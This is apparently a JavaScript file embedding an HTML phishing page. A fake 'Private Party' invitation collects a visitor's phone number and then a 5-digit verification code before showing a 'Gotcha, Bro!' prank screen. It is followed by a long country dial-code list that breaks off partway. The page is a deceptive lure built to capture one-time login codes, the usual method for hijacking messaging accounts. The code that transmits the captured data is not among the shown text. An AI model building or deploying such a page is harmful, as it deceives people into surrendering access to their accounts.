const HTML_CONTENT = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🎉 Private Party Access</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Tahoma,sans-serif}
body{min-height:100vh;background:linear-gradient(135deg,#1a0033,#3d0066,#660066);display:flex;align-items:center;justify-content:center}
.card{background:rgba(255,255,255,.1);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.2);border-radius:25px;padding:40px 30px;width:90%;max-width:420px;text-align:center;color:#fff;animation:popIn .6s ease}
@keyframes popIn{from{transform:scale(.8);opacity:0}to{transform:scale(1);opacity:1}}
.card h1{font-size:28px;margin:10px 0}
.card p{font-size:15px;opacity:.85;margin-bottom:25px;line-height:1.8}
.emoji{font-size:70px;margin-bottom:15px;display:block;animation:bounce 2s infinite}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
.btn{background:linear-gradient(135deg,#ff006e,#8338ec);color:#fff;border:none;padding:15px 40px;border-radius:50px;font-size:17px;font-weight:bold;cursor:pointer;width:100%;transition:transform .2s}
.btn:hover{transform:translateY(-3px)}
.btn:disabled{opacity:.6;cursor:not-allowed}
input{width:100%;padding:14px;background:rgba(255,255,255,.1);border:2px solid rgba(255,255,255,.2);border-radius:15px;color:#fff;font-size:18px;text-align:center;margin-bottom:15px;outline:none}
input:focus{border-color:#ff006e}
input::placeholder{color:rgba(255,255,255,.5)}
.hidden{display:none!important}
.error{color:#ff6b9d;font-size:14px;margin-top:10px}
.loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-left:10px}
@keyframes spin{to{transform:rotate(360deg)}}
.country-select{display:flex;align-items:center;background:rgba(255,255,255,.1);border:2px solid rgba(255,255,255,.2);border-radius:15px;margin-bottom:15px;overflow:hidden;cursor:pointer}
.country-select:hover{border-color:#ff006e}
.country-flag{font-size:24px;padding:12px 15px;background:rgba(255,255,255,.05)}
.country-info{flex:1;text-align:right;padding:0 15px;color:#fff}
.country-name{font-size:14px;font-weight:bold}
.country-code{font-size:12px;opacity:.7}
.country-arrow{padding:0 15px;font-size:18px;opacity:.6}
.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);display:none;align-items:center;justify-content:center;z-index:100}
.modal.active{display:flex}
.modal-content{background:linear-gradient(135deg,#2a0052,#4d0080);border:1px solid rgba(255,255,255,.2);border-radius:20px;width:90%;max-width:400px;max-height:80vh;display:flex;flex-direction:column}
.modal-header{padding:20px;border-bottom:1px solid rgba(255,255,255,.1);display:flex;justify-content:space-between;align-items:center}
.modal-header h2{font-size:18px;color:#fff}
.close-btn{background:none;border:none;color:#fff;font-size:24px;cursor:pointer;opacity:.7}
.close-btn:hover{opacity:1}
.search-input{margin:15px;padding:12px 15px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:10px;color:#fff;font-size:14px;outline:none}
.search-input::placeholder{color:rgba(255,255,255,.5)}
.country-list{overflow-y:auto;padding:0 10px 15px;flex:1}
.country-item{display:flex;align-items:center;padding:12px 15px;border-radius:10px;cursor:pointer;color:#fff;margin-bottom:3px}
.country-item:hover{background:rgba(255,255,255,.1)}
.country-item .flag{font-size:22px;margin-right:12px}
.country-item .name{flex:1;font-size:14px}
.country-item .code{font-size:13px;opacity:.7}
.country-list::-webkit-scrollbar{width:6px}
.country-list::-webkit-scrollbar-track{background:rgba(255,255,255,.05)}
.country-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,.2);border-radius:3px}
.hint{font-size:12px;opacity:.6;margin-top:-10px;margin-bottom:15px;text-align:right}
.badge{display:inline-block;background:rgba(255,0,110,.3);padding:5px 15px;border-radius:20px;font-size:12px;margin-bottom:15px;border:1px solid rgba(255,0,110,.5)}
.success-emoji{font-size:90px;animation:bounce 1s infinite}
</style>
</head>
<body>
<div class="card" id="step1">
<span class="emoji">🎊</span>
<div class="badge">🔒 Restricted Access</div>
<h1>Private Party Tonight</h1>
<p>Only invited guests can get in!<br>Click below to request your access code.</p>
<button class="btn" onclick="goToStep2()">🚪 Enter The Party</button>
</div>
<div class="card hidden" id="step2">
<span class="emoji">📱</span>
<h1>Phone Verification</h1>
<p>Select your country and enter your phone number.</p>
<div class="country-select" onclick="openCountryModal()">
<span class="country-flag" id="selFlag">🌍</span>
<div class="country-info">
<div class="country-name" id="selName">Select Country</div>
<div class="country-code" id="selCode">Choose your country</div>
</div>
<span class="country-arrow">▼</span>
</div>
<input type="tel" id="phone" placeholder="Phone number" disabled>
<div class="hint" id="phoneHint"></div>
<button class="btn" onclick="sendPhone()">📤 Send Code</button>
<div class="error" id="err"></div>
</div>
<div class="card hidden" id="step3">
<span class="emoji">🔑</span>
<h1>Enter Verification Code</h1>
<p>Enter the 5-digit code sent to you.</p>
<input type="text" id="code" placeholder="• • • • •" maxlength="5">
<button class="btn" id="verifyBtn" onclick="verifyCode()">✅ Verify & Enter</button>
<div class="error" id="err2"></div>
</div>
<div class="card hidden" id="step4">
<span class="success-emoji">🤡</span>
<h1>Gotcha, Bro!</h1>
<p>😂 Thought it was a real party?!<br>From your friend 💀</p>
</div>
<div class="modal" id="countryModal">
<div class="modal-content">
<div class="modal-header">
<h2>🌍 Select Your Country</h2>
<button class="close-btn" onclick="closeCountryModal()">✕</button>
</div>
<input type="text" class="search-input" id="searchCountry" placeholder="🔍 Search country..." oninput="filterCountries()">
<div class="country-list" id="countryList"></div>
</div>
</div>
<script>
const countries=[
{name:"Afghanistan",flag:"🇦🇫",code:"+93",regex:/^7\\d{8}$/,hint:"7X XXX XXXX"},
{name:"Albania",flag:"🇦🇱",code:"+355",regex:/^6[6-9]\\d{7}$/,hint:"6X XXX XXXX"},
{name:"Algeria",flag:"🇩🇿",code:"+213",regex:/^[5-7]\\d{8}$/,hint:"5/6/7X XXX XXXX"},
{name:"American Samoa",flag:"🇦🇸",code:"+1-684",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Andorra",flag:"🇦🇩",code:"+376",regex:/^[3-6]\\d{5}$/,hint:"6 digits"},
{name:"Angola",flag:"🇦🇴",code:"+244",regex:/^9\\d{8}$/,hint:"9XX XXX XXX"},
{name:"Anguilla",flag:"🇦🇮",code:"+1-264",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Antigua and Barbuda",flag:"🇦🇬",code:"+1-268",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Argentina",flag:"🇦🇷",code:"+54",regex:/^9?\\d{10}$/,hint:"10-11 digits"},
{name:"Armenia",flag:"🇦🇲",code:"+374",regex:/^[7-9]\\d{7}$/,hint:"8 digits"},
{name:"Aruba",flag:"🇦🇼",code:"+297",regex:/^[25679]\\d{6}$/,hint:"7 digits"},
{name:"Australia",flag:"🇦🇺",code:"+61",regex:/^4\\d{8}$/,hint:"4XX XXX XXX"},
{name:"Austria",flag:"🇦🇹",code:"+43",regex:/^6\\d{8,11}$/,hint:"6XX XXX XXXX"},
{name:"Azerbaijan",flag:"🇦🇿",code:"+994",regex:/^(?:5[0-5]|7[07]|10)\\d{7}$/,hint:"5X/7X XXX XXXX"},
{name:"Bahamas",flag:"🇧🇸",code:"+1-242",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Bahrain",flag:"🇧🇭",code:"+973",regex:/^[36]\\d{7}$/,hint:"8 digits"},
{name:"Bangladesh",flag:"🇧🇩",code:"+880",regex:/^1[3-9]\\d{8}$/,hint:"1X XXXXXXXX"},
{name:"Barbados",flag:"🇧🇧",code:"+1-246",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Belarus",flag:"🇧🇾",code:"+375",regex:/^(?:25|29|33|44)\\d{7}$/,hint:"2X/3X/4X XXX XXXX"},
{name:"Belgium",flag:"🇧🇪",code:"+32",regex:/^4[5-9]\\d{7}$/,hint:"4XX XX XX XX"},
{name:"Belize",flag:"🇧🇿",code:"+501",regex:/^6\\d{6}$/,hint:"7 digits"},
{name:"Benin",flag:"🇧🇯",code:"+229",regex:/^[25-69]\\d{7}$/,hint:"8 digits"},
{name:"Bermuda",flag:"🇧🇲",code:"+1-441",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Bhutan",flag:"🇧🇹",code:"+975",regex:/^[17]\\d{7}$/,hint:"8 digits"},
{name:"Bolivia",flag:"🇧🇴",code:"+591",regex:/^[67]\\d{7}$/,hint:"8 digits"},
{name:"Bonaire",flag:"🇧🇶",code:"+599",regex:/^[347]\\d{6}$/,hint:"7 digits"},
{name:"Bosnia and Herzegovina",flag:"🇧🇦",code:"+387",regex:/^6[0-6]\\d{6,7}$/,hint:"8-9 digits"},
{name:"Botswana",flag:"🇧🇼",code:"+267",regex:/^7[1-8]\\d{6}$/,hint:"8 digits"},
{name:"Brazil",flag:"🇧🇷",code:"+55",regex:/^[1-9][1-9]9?\\d{8}$/,hint:"XX 9XXXX XXXX"},
{name:"British Virgin Islands",flag:"🇻🇬",code:"+1-284",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Brunei",flag:"🇧🇳",code:"+673",regex:/^[7-8]\\d{6}$/,hint:"7 digits"},
{name:"Bulgaria",flag:"🇧🇬",code:"+359",regex:/^8[7-9]\\d{7}$/,hint:"8X XXX XXXX"},
{name:"Burkina Faso",flag:"🇧🇫",code:"+226",regex:/^[067]\\d{7}$/,hint:"8 digits"},
{name:"Burundi",flag:"🇧🇮",code:"+257",regex:/^[2367]\\d{7}$/,hint:"8 digits"},
{name:"Cambodia",flag:"🇰🇭",code:"+855",regex:/^(?:1\\d|6[016-9]|7[06-9]|8[0-8]|9[06-9])\\d{6}$/,hint:"9 digits"},
{name:"Cameroon",flag:"🇨🇲",code:"+237",regex:/^6[5-9]\\d{7}$/,hint:"9 digits"},
{name:"Canada",flag:"🇨🇦",code:"+1",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Cape Verde",flag:"🇨🇻",code:"+238",regex:/^[2-9]\\d{6}$/,hint:"7 digits"},
{name:"Cayman Islands",flag:"🇰🇾",code:"+1-345",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Central African Republic",flag:"🇨🇫",code:"+236",regex:/^[72]\\d{7}$/,hint:"8 digits"},
{name:"Chad",flag:"🇹🇩",code:"+235",regex:/^[2679]\\d{7}$/,hint:"8 digits"},
{name:"Chile",flag:"🇨🇱",code:"+56",regex:/^9\\d{8}$/,hint:"9 XXXX XXXX"},
{name:"China",flag:"🇨🇳",code:"+86",regex:/^1[3-9]\\d{9}$/,hint:"1XX XXXX XXXX"},
{name:"Christmas Island",flag:"🇨🇽",code:"+61",regex:/^4\\d{8}$/,hint:"4XX XXX XXX"},
{name:"Cocos Islands",flag:"🇨🇨",code:"+61",regex:/^4\\d{8}$/,hint:"4XX XXX XXX"},
{name:"Colombia",flag:"🇨🇴",code:"+57",regex:/^3\\d{9}$/,hint:"3XX XXX XXXX"},
{name:"Comoros",flag:"🇰🇲",code:"+269",regex:/^[347]\\d{6}$/,hint:"7 digits"},
{name:"Congo",flag:"🇨🇬",code:"+242",regex:/^0[15-7]\\d{7}$/,hint:"9 digits"},
{name:"Cook Islands",flag:"🇨🇰",code:"+682",regex:/^[257]\\d{4}$/,hint:"5 digits"},
{name:"Costa Rica",flag:"🇨🇷",code:"+506",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
{name:"Croatia",flag:"🇭🇷",code:"+385",regex:/^9[1-9]\\d{7,8}$/,hint:"9X XXX XXXX"},
{name:"Cuba",flag:"🇨🇺",code:"+53",regex:/^5\\d{7}$/,hint:"5X XXX XXXX"},
{name:"Curaçao",flag:"🇨🇼",code:"+599",regex:/^9\\d{6}$/,hint:"7 digits"},
{name:"Cyprus",flag:"🇨🇾",code:"+357",regex:/^9[4-79]\\d{6}$/,hint:"8 digits"},
{name:"Czech Republic",flag:"🇨🇿",code:"+420",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Denmark",flag:"🇩🇰",code:"+45",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
{name:"Djibouti",flag:"🇩🇯",code:"+253",regex:/^[72]\\d{7}$/,hint:"8 digits"},
{name:"Dominica",flag:"🇩🇲",code:"+1-767",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Dominican Republic",flag:"🇩🇴",code:"+1-809",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Ecuador",flag:"🇪🇨",code:"+593",regex:/^9\\d{8}$/,hint:"9X XXX XXXX"},
{name:"Egypt",flag:"🇪🇬",code:"+20",regex:/^1[0-5]\\d{8}$/,hint:"1X XXXX XXXX"},
{name:"El Salvador",flag:"🇸🇻",code:"+503",regex:/^[267]\\d{7}$/,hint:"8 digits"},
{name:"Equatorial Guinea",flag:"🇬🇶",code:"+240",regex:/^[256]\\d{8}$/,hint:"9 digits"},
{name:"Eritrea",flag:"🇪🇷",code:"+291",regex:/^[178]\\d{6}$/,hint:"7 digits"},
{name:"Estonia",flag:"🇪🇪",code:"+372",regex:/^(?:5\\d|8[1-5])\\d{6}$/,hint:"7-8 digits"},
{name:"Eswatini",flag:"🇸🇿",code:"+268",regex:/^[27]\\d{7}$/,hint:"8 digits"},
{name:"Ethiopia",flag:"🇪🇹",code:"+251",regex:/^9\\d{8}$/,hint:"9XX XXX XXX"},
{name:"Falkland Islands",flag:"🇫🇰",code:"+500",regex:/^[256]\\d{4}$/,hint:"5 digits"},
{name:"Faroe Islands",flag:"🇫🇴",code:"+298",regex:/^[2-9]\\d{5}$/,hint:"6 digits"},
{name:"Fiji",flag:"🇫🇯",code:"+679",regex:/^[7-9]\\d{6}$/,hint:"7 digits"},
{name:"Finland",flag:"🇫🇮",code:"+358",regex:/^4\\d{8,9}$/,hint:"4X XXX XXXX"},
{name:"France",flag:"🇫🇷",code:"+33",regex:/^[67]\\d{8}$/,hint:"6/7X XX XX XX XX"},
{name:"French Guiana",flag:"🇬🇫",code:"+594",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"French Polynesia",flag:"🇵🇫",code:"+689",regex:/^8[7-9]\\d{6}$/,hint:"8 digits"},
{name:"Gabon",flag:"🇬🇦",code:"+241",regex:/^[067]\\d{7}$/,hint:"8 digits"},
{name:"Gambia",flag:"🇬🇲",code:"+220",regex:/^[3-9]\\d{6}$/,hint:"7 digits"},
{name:"Georgia",flag:"🇬🇪",code:"+995",regex:/^5\\d{8}$/,hint:"5XX XXX XXX"},
{name:"Germany",flag:"🇩🇪",code:"+49",regex:/^1[5-7]\\d{8,9}$/,hint:"15X/16X/17X XXXXXXX"},
{name:"Ghana",flag:"🇬🇭",code:"+233",regex:/^[235]\\d{8}$/,hint:"XX XXX XXXX"},
{name:"Gibraltar",flag:"🇬🇮",code:"+350",regex:/^[256]\\d{7}$/,hint:"8 digits"},
{name:"Greece",flag:"🇬🇷",code:"+30",regex:/^69\\d{8}$/,hint:"69X XXX XXXX"},
{name:"Greenland",flag:"🇬🇱",code:"+299",regex:/^[2-9]\\d{5}$/,hint:"6 digits"},
{name:"Grenada",flag:"🇬🇩",code:"+1-473",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Guadeloupe",flag:"🇬🇵",code:"+590",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Guam",flag:"🇬🇺",code:"+1-671",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Guatemala",flag:"🇬🇹",code:"+502",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
{name:"Guernsey",flag:"🇬🇬",code:"+44-1481",regex:/^7\\d{9}$/,hint:"10 digits"},
{name:"Guinea",flag:"🇬🇳",code:"+224",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Guinea-Bissau",flag:"🇬🇼",code:"+245",regex:/^[4-79]\\d{7}$/,hint:"8 digits"},
{name:"Guyana",flag:"🇬🇾",code:"+592",regex:/^6\\d{6}$/,hint:"7 digits"},
{name:"Haiti",flag:"🇭🇹",code:"+509",regex:/^[34]\\d{7}$/,hint:"8 digits"},
{name:"Honduras",flag:"🇭🇳",code:"+504",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
{name:"Hungary",flag:"🇭🇺",code:"+36",regex:/^(?:20|30|31|70)\\d{7}$/,hint:"20/30/70 XXX XXXX"},
{name:"Iceland",flag:"🇮🇸",code:"+354",regex:/^[6-9]\\d{6}$/,hint:"7 digits"},
{name:"India",flag:"🇮🇳",code:"+91",regex:/^[6-9]\\d{9}$/,hint:"10 digits"},
{name:"Indonesia",flag:"🇮🇩",code:"+62",regex:/^8[1-9]\\d{7,10}$/,hint:"8XX XXX XXXX"},
{name:"Iran",flag:"🇮🇷",code:"+98",regex:/^9[0-39]\\d{8}$/,hint:"9XX XXX XXXX"},
{name:"Iraq",flag:"🇮🇶",code:"+964",regex:/^7[3-9]\\d{8}$/,hint:"7XX XXX XXXX"},
{name:"Ireland",flag:"🇮🇪",code:"+353",regex:/^8[3-9]\\d{7,8}$/,hint:"8X XXX XXXX"},
{name:"Isle of Man",flag:"🇮🇲",code:"+44-1624",regex:/^7\\d{9}$/,hint:"10 digits"},
{name:"Israel",flag:"🇮🇱",code:"+972",regex:/^5[0-9]\\d{7}$/,hint:"5X XXX XXXX"},
{name:"Italy",flag:"🇮🇹",code:"+39",regex:/^3\\d{9}$/,hint:"3XX XXX XXXX"},
{name:"Ivory Coast",flag:"🇨🇮",code:"+225",regex:/^[0-9]\\d{7}$/,hint:"8 digits"},
{name:"Jamaica",flag:"🇯🇲",code:"+1-876",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Japan",flag:"🇯🇵",code:"+81",regex:/^[7-9]0\\d{8}$/,hint:"X0 XXXX XXXX"},
{name:"Jersey",flag:"🇯🇪",code:"+44-1534",regex:/^7\\d{9}$/,hint:"10 digits"},
{name:"Jordan",flag:"🇯🇴",code:"+962",regex:/^7[7-9]\\d{7}$/,hint:"7X XXX XXXX"},
{name:"Kazakhstan",flag:"🇰🇿",code:"+7",regex:/^7[01-9]\\d{8}$/,hint:"7XX XXX XX XX"},
{name:"Kenya",flag:"🇰🇪",code:"+254",regex:/^[17]\\d{8}$/,hint:"7XX XXX XXX"},
{name:"Kiribati",flag:"🇰🇮",code:"+686",regex:/^[6-9]\\d{6}$/,hint:"7 digits"},
{name:"Kosovo",flag:"🇽🇰",code:"+383",regex:/^4[3-9]\\d{7}$/,hint:"9 digits"},
{name:"Kuwait",flag:"🇰🇼",code:"+965",regex:/^[569]\\d{7}$/,hint:"8 digits"},
{name:"Kyrgyzstan",flag:"🇰🇬",code:"+996",regex:/^(?:20|22|55|70|77)\\d{7}$/,hint:"XXX XXX XXX"},
{name:"Laos",flag:"🇱🇦",code:"+856",regex:/^20\\d{8,9}$/,hint:"20 XXXX XXXX"},
{name:"Latvia",flag:"🇱🇻",code:"+371",regex:/^2\\d{7}$/,hint:"8 digits"},
{name:"Lebanon",flag:"🇱🇧",code:"+961",regex:/^(?:3|7[0-1]|7[6-9])\\d{6,7}$/,hint:"7-8 digits"},
{name:"Lesotho",flag:"🇱🇸",code:"+266",regex:/^[56]\\d{7}$/,hint:"8 digits"},
{name:"Liberia",flag:"🇱🇷",code:"+231",regex:/^[4-9]\\d{7,8}$/,hint:"8-9 digits"},
{name:"Libya",flag:"🇱🇾",code:"+218",regex:/^9[1-6]\\d{7,8}$/,hint:"9-10 digits"},
{name:"Liechtenstein",flag:"🇱🇮",code:"+423",regex:/^6[6-9]\\d{6}$/,hint:"8 digits"},
{name:"Lithuania",flag:"🇱🇹",code:"+370",regex:/^6\\d{7}$/,hint:"8 digits"},
{name:"Luxembourg",flag:"🇱🇺",code:"+352",regex:/^6[26-9]1\\d{6}$/,hint:"9 digits"},
{name:"Madagascar",flag:"🇲🇬",code:"+261",regex:/^3[2-4]\\d{7}$/,hint:"9 digits"},
{name:"Malawi",flag:"🇲🇼",code:"+265",regex:/^(?:1|3|77|88|99)\\d{7}$/,hint:"9 digits"},
{name:"Malaysia",flag:"🇲🇾",code:"+60",regex:/^1[0-9]\\d{7,8}$/,hint:"1X XXX XXXX"},
{name:"Maldives",flag:"🇲🇻",code:"+960",regex:/^[79]\\d{6}$/,hint:"7 digits"},
{name:"Mali",flag:"🇲🇱",code:"+223",regex:/^[26-9]\\d{7}$/,hint:"8 digits"},
{name:"Malta",flag:"🇲🇹",code:"+356",regex:/^[79]\\d{7}$/,hint:"8 digits"},
{name:"Marshall Islands",flag:"🇲🇭",code:"+692",regex:/^[2-9]\\d{5}$/,hint:"6 digits"},
{name:"Martinique",flag:"🇲🇶",code:"+596",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Mauritania",flag:"🇲🇷",code:"+222",regex:/^[2-4]\\d{7}$/,hint:"8 digits"},
{name:"Mauritius",flag:"🇲🇺",code:"+230",regex:/^5\\d{7}$/,hint:"8 digits"},
{name:"Mayotte",flag:"🇾🇹",code:"+262",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Mexico",flag:"🇲🇽",code:"+52",regex:/^1?[2-9]\\d{9}$/,hint:"10 digits"},
{name:"Micronesia",flag:"🇫🇲",code:"+691",regex:/^[39]\\d{5}$/,hint:"6 digits"},
{name:"Moldova",flag:"🇲🇩",code:"+373",regex:/^(?:6[0-9]|7[16-9])\\d{6}$/,hint:"8 digits"},
{name:"Monaco",flag:"🇲🇨",code:"+377",regex:/^6\\d{8}$/,hint:"9 digits"},
{name:"Mongolia",flag:"🇲🇳",code:"+976",regex:/^[89]\\d{7}$/,hint:"8 digits"},
{name:"Montenegro",flag:"🇲🇪",code:"+382",regex:/^6[3-9]\\d{7,8}$/,hint:"8-9 digits"},
{name:"Montserrat",flag:"🇲🇸",code:"+1-664",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Morocco",flag:"🇲🇦",code:"+212",regex:/^[67]\\d{8}$/,hint:"6/7X XXX XXXX"},
{name:"Mozambique",flag:"🇲🇿",code:"+258",regex:/^8[2-7]\\d{7}$/,hint:"9 digits"},
{name:"Myanmar",flag:"🇲🇲",code:"+95",regex:/^9[2-9]\\d{7,9}$/,hint:"9-11 digits"},
{name:"Namibia",flag:"🇳🇦",code:"+264",regex:/^[6-8]\\d{7,8}$/,hint:"8-9 digits"},
{name:"Nauru",flag:"🇳🇷",code:"+674",regex:/^[5689]\\d{6}$/,hint:"7 digits"},
{name:"Nepal",flag:"🇳🇵",code:"+977",regex:/^9[6-8]\\d{8}$/,hint:"10 digits"},
{name:"Netherlands",flag:"🇳🇱",code:"+31",regex:/^6\\d{8}$/,hint:"6 XX XX XX XX"},
{name:"New Caledonia",flag:"🇳🇨",code:"+687",regex:/^[7-9]\\d{5}$/,hint:"6 digits"},
{name:"New Zealand",flag:"🇳🇿",code:"+64",regex:/^2[02-9]\\d{7,9}$/,hint:"2X XXX XXXX"},
{name:"Nicaragua",flag:"🇳🇮",code:"+505",regex:/^[5-8]\\d{7}$/,hint:"8 digits"},
{name:"Niger",flag:"🇳🇪",code:"+227",regex:/^[0-9]\\d{7}$/,hint:"8 digits"},
{name:"Nigeria",flag:"🇳🇬",code:"+234",regex:/^[7-9]0\\d{8}$/,hint:"10 digits"},
{name:"Niue",flag:"🇳🇺",code:"+683",regex:/^[1-9]\\d{3}$/,hint:"4 digits"},
{name:"Norfolk Island",flag:"🇳🇫",code:"+672",regex:/^3\\d{5}$/,hint:"6 digits"},
{name:"North Korea",flag:"🇰🇵",code:"+850",regex:/^1\\d{9}$/,hint:"10 digits"},
{name:"North Macedonia",flag:"🇲🇰",code:"+389",regex:/^7\\d{7}$/,hint:"8 digits"},
{name:"Northern Mariana Islands",flag:"🇲🇵",code:"+1-670",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Norway",flag:"🇳🇴",code:"+47",regex:/^[49]\\d{7}$/,hint:"8 digits"},
{name:"Oman",flag:"🇴🇲",code:"+968",regex:/^[79]\\d{7}$/,hint:"8 digits"},
{name:"Pakistan",flag:"🇵🇰",code:"+92",regex:/^3[0-9]\\d{8}$/,hint:"3XX XXX XXXX"},
{name:"Palau",flag:"🇵🇼",code:"+680",regex:/^[2-9]\\d{6}$/,hint:"7 digits"},
{name:"Palestine",flag:"🇵🇸",code:"+970",regex:/^5[6-9]\\d{7}$/,hint:"9 digits"},
{name:"Panama",flag:"🇵🇦",code:"+507",regex:/^[5-9]\\d{7}$/,hint:"8 digits"},
{name:"Papua New Guinea",flag:"🇵🇬",code:"+675",regex:/^7\\d{7}$/,hint:"8 digits"},
{name:"Paraguay",flag:"🇵🇾",code:"+595",regex:/^9[1-9]\\d{7}$/,hint:"9 digits"},
{name:"Peru",flag:"🇵🇪",code:"+51",regex:/^9\\d{8}$/,hint:"9XX XXX XXX"},
{name:"Philippines",flag:"🇵🇭",code:"+63",regex:/^9\\d{9}$/,hint:"9XX XXX XXXX"},
{name:"Pitcairn Islands",flag:"🇵🇳",code:"+64",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
{name:"Poland",flag:"🇵🇱",code:"+48",regex:/^[5-8]\\d{8}$/,hint:"9 digits"},
{name:"Portugal",flag:"🇵🇹",code:"+351",regex:/^9[1-36]\\d{7}$/,hint:"9 digits"},
{name:"Puerto Rico",flag:"🇵🇷",code:"+1-787",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Qatar",flag:"🇶🇦",code:"+974",regex:/^[35-7]\\d{7}$/,hint:"8 digits"},
{name:"Réunion",flag:"🇷🇪",code:"+262",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Romania",flag:"🇷🇴",code:"+40",regex:/^7\\d{8}$/,hint:"7X XXX XXXX"},
{name:"Russia",flag:"🇷🇺",code:"+7",regex:/^9\\d{9}$/,hint:"9XX XXX XX XX"},
{name:"Rwanda",flag:"🇷🇼",code:"+250",regex:/^7[2-9]\\d{7}$/,hint:"9 digits"},
{name:"Saint Barthélemy",flag:"🇧🇱",code:"+590",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Saint Helena",flag:"🇸🇭",code:"+290",regex:/^[2-9]\\d{3}$/,hint:"4 digits"},
{name:"Saint Kitts and Nevis",flag:"🇰🇳",code:"+1-869",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Saint Lucia",flag:"🇱🇨",code:"+1-758",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Saint Martin",flag:"🇲🇫",code:"+590",regex:/^[67]\\d{8}$/,hint:"9 digits"},
{name:"Saint Pierre and Miquelon",flag:"🇵🇲",code:"+508",regex:/^[45]\\d{5}$/,hint:"6 digits"},
{name:"Saint Vincent",flag:"🇻🇨",code:"+1-784",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Samoa",flag:"🇼🇸",code:"+685",regex:/^[2-9]\\d{5}$/,hint:"6 digits"},
{name:"San Marino",flag:"🇸🇲",code:"+378",regex:/^[3-9]\\d{7}$/,hint:"8 digits"},
{name:"Sao Tome and Principe",flag:"🇸🇹",code:"+239",regex:/^9[89]\\d{5}$/,hint:"7 digits"},
{name:"Saudi Arabia",flag:"🇸🇦",code:"+966",regex:/^5\\d{8}$/,hint:"5X XXX XXXX"},
{name:"Senegal",flag:"🇸🇳",code:"+221",regex:/^7[05-8]\\d{7}$/,hint:"9 digits"},
{name:"Serbia",flag:"🇷🇸",code:"+381",regex:/^6[0-9]\\d{7,8}$/,hint:"8-9 digits"},
{name:"Seychelles",flag:"🇸🇨",code:"+248",regex:/^2[5-8]\\d{5}$/,hint:"7 digits"},
{name:"Sierra Leone",flag:"🇸🇱",code:"+232",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
{name:"Singapore",flag:"🇸🇬",code:"+65",regex:/^[89]\\d{7}$/,hint:"8 digits"},
{name:"Sint Maarten",flag:"🇸🇽",code:"+1-721",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
{name:"Slovakia",flag:"🇸🇰",code:"+421",regex:/^9\\d{8}$/,hint:"9 digits"},
{name:"Slovenia",flag:"🇸🇮",code:"+386",regex:/^[3-7]\\d{7}$/,hint:"8 digits"},
{name:"Solomon Islands",flag:"🇸🇧",code:"+677",regex:/^[7-9]\\d{6}$/,hint:"7 digits"},
{name:"Somalia",flag:"🇸🇴",code:"+252",regex:/^(?:6|7[1-9])\\d{7,8}$/,hint:"8-9 digits"},
{name:"South Africa",flag:"🇿🇦",code:"+27",regex:/^[6-8]\\d{8}$/,hint:"9 digits"},
{name:"South Korea",flag:"🇰🇷",code:"+82",regex:/^1[0-9]\\d{8,9}$/,hint:"1X XXX XXXX"},
{name:"South Sudan",flag:"🇸🇸",code:"+211",regex:/^[19]\\d{8}$/,hint:"9 digits"},
{name:"Spain",flag:"🇪🇸",code:"+34",regex:/^[67]\\d{8}$/,hint:"6/7X XXX XXXX"},
{name:"Sri Lanka",flag:"🇱🇰",code:"+94",regex:/^7[0-8]\\d{7}$/,hint:"9 digits"},
{name:"Sudan",flag:"🇸🇩",code:"+249",regex:/^9[0-9]\\d{7}$/,hint:"9 digits"},
{name:"Suriname",flag:"🇸🇷",code:"+597",regex:/^[6-8]\\d{6}$/,hint:"7 digits"},
{name:"Svalbard",flag:"🇸🇯",code:"+47-79",regex:/^[49]\\d{7}$/,hint:"8 digits"},
